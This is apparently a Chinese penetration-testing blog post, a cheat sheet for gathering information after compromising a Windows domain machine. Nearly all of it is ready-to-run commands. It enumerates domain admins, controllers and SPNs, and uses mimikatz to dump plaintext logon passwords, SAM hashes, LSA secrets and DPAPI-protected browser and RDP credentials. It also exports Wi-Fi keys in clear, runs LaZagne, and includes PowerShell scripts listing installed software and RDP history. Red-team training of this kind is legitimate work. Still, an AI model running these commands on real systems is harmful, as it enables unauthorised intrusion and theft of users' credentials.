---
title: "Windows 域内信息收集"
date: 2019-07-10T00:00:00+08:00
draft: false
tags: ['domain','windows']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

在拿到一台 windows 机器后对其本机的信息收集.

很多一部分都是依赖于系统自带的命令以及 powershell.

<!--more-->

```
用户 Hash 当前域 域控 域内计算机 spn IP地址 arp 缓存 dns 缓存 hosts

端口 进程 杀软 补丁 代理 已安装软件 本机凭证 ipc 共享 防火墙策略

计划任务 启动项 回收站 vpn 密码 wifi 密码 (如果有

rdp 记录 浏览器 cookies 历史记录 书签 已保存密码 

敏感文件 web 服务器 数据库 中间件
```

## 用户

```
net user // 查看所有用户
net view // 查看计算机
net view /domain // 查看所有域
net user /domain // 查看域内用户
```

```
mimikatz "log" "privilege::debug" "sekurlsa::logonpasswords" “exit" // 明文密码
mimikatz "log" "privilege::debug" "lsadump::sam /system:system.hive /sam:sam.hive" "exit" // Hash
```

## 域控

```
net group "Domain Controllers" /domain // 查看域控
net group "Domain Admins" /domain // 查看域管理员
net group "Enterprise Admins" /domain // 查看全局管理员
net time /domain // 定位当前域控
```

## ipc 共享

```
net share // 查看共享
net use // 查看连接
```

## 网络信息

```
type C:\Windows\System32\drivers\etc\hosts // hosts 信息
ipconfig /all // ip dns 网关信息
ipconfig  /displaydns // dns 缓存
arp -a // arp 缓存
```

## 进程 端口 凭据 系统信息

```
tasklist /svc // 查看当前进程
netstat -ano // 查看开放端口
cmdkey /list // 查看本机凭据
systeminfo // 本机信息 补丁
```

## spn

```
setspn -T test.com –q */* // 当前域的 spn 信息
setspn -q */* // 所有域的 spn 信息
```

## 计划任务
 
```
schtasks /Query // 计划任务
```

## 浏览器代理

```
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

## 启动项

```
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run // 用户级别
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run // 系统级别
```

## 防火墙策略

```
netsh firewall show config // 2003 防火墙策略
netsh advfirewall firewall show rule name=all // 2008 2012 防火墙策略
```

## wifi 密码

```
netsh wlan export profile interface=WLAN key=clear folder=C:\
```

## 回收站记录

```
$Recycler = (New-Object -ComObject Shell.Application).NameSpace(0xa);
foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33-40FF-11D2-A27E-00C04FC30871} 2")+'\'+$file.name;$file.Type}
```

## vpn 连接

```
mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```

## 浏览器密码 书签 历史记录 cookies

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* // 显示本机凭据
mimikatz "log" "privilege::debug" "dpapi::chrome /in:[FILENAME] /masterkey:[MASTERKEY]" "exit"
WebBrowserPassView.exe
lazagne.exe all
......
```

## 敏感文件

```
dir/b/s config.* // 在当前目录下搜索
```

## 已安装软件

```
Get-WmiObject -class Win32_Product |Select-Object -Property name // 不全
wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product get name /FORMAT:table // 不全
```

```
<#
.SYNOPSIS
This script can be used to list the programs that the current Windows system has installed.
Supprot x86 and x64 
Author: 3gstudent@3gstudent
License: BSD 3-Clause
#>

Function ListPrograms
{  
	param($RegPath)  
	$QueryPath = dir $RegPath -Name
	foreach($Name in $QueryPath)
	{
    	(Get-ItemProperty -Path $RegPath$Name).DisplayName
#        (Get-ItemProperty -Path $RegPath$Name).Publisher
#        (Get-ItemProperty -Path $RegPath$Name).DisplayVersion
	}
} 
if ([IntPtr]::Size -eq 8)
{
	Write-Host "[*] OS: x64"
	Write-Host "[*] List the 64 bit programs that have been installed"
	$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
	ListPrograms -RegPath $RegPath

	Write-Host "[+] List the 32 bit programs that have been installed"

	$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\"
	ListPrograms -RegPath $RegPath
 }
else
{
	Write-Host "[*] OS: x86"
 	Write-Host "[*] List the 32 bit programs that have been installed"
	$RegPath = "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
	ListPrograms -RegPath $RegPath
}
```

## rdp 连接记录

```
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* // 显示本机凭据
mimikatz "log" "privilege::debug" "dpapi::cred /in:[FILENAME] /masterkey:[MASTERKEY]" "exit" // 导出 rdp 密码
```

```
<#
.SYNOPSIS
This script will list all users' RDP Connections History.
First use "reg load" to load hive.
Then read the RDP Connections History from HKEY_USERS.
Last you need to use "reg unload" to unload hive. 
The script automatically implements the above operation,there is no need for a GUI. :)
Author: 3gstudent@3gstudent
License: BSD 3-Clause
#>
$AllUser = Get-WmiObject -Class Win32_UserAccount
foreach($User in $AllUser)
{
	$RegPath = "Registry::HKEY_USERS\"+$User.SID+"\Software\Microsoft\Terminal Server Client\Servers\"
	Write-Host "User:"$User.Name
	Write-Host "SID:"$User.SID
	Write-Host "Status:"$User.Status
	$QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue
	If(!$?)
	{
		Write-Host "[!]Not logged in"
		Write-Host "[*]Try to load Hive"
		$File = "C:\Documents and Settings\"+$User.Name+"\NTUSER.DAT"
		$Path = "HKEY_USERS\"+$User.SID
		Write-Host "[+]Path:"$Path 
		Write-Host "[+]File:"$File
		Reg load $Path $File
		If(!$?)
		{
			Write-Host "[!]Fail to load Hive"
			Write-Host "[!]No RDP Connections History"
		}
		Else
		{
			$QueryPath = dir $RegPath -Name -ErrorAction SilentlyContinue
			If(!$?)
			{
				Write-Host "[!]No RDP Connections History"
			}
			Else
			{
				foreach($Name in $QueryPath)
				{   
					$User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint
					Write-Host "Server:"$Name
					Write-Host "User:"$User
				}
			}
			Write-Host "[*]Try to unload Hive"
			Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "Reg unload $Path"		
		}
	}
	foreach($Name in $QueryPath)
	{   
		Try  
		{  
			$User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop).UsernameHint
			Write-Host "Server:"$Name
			Write-Host "User:"$User
		}
		Catch  
		{
			Write-Host "[!]No RDP Connections History"
		}
	}
	Write-Host "----------------------------------"	
}
```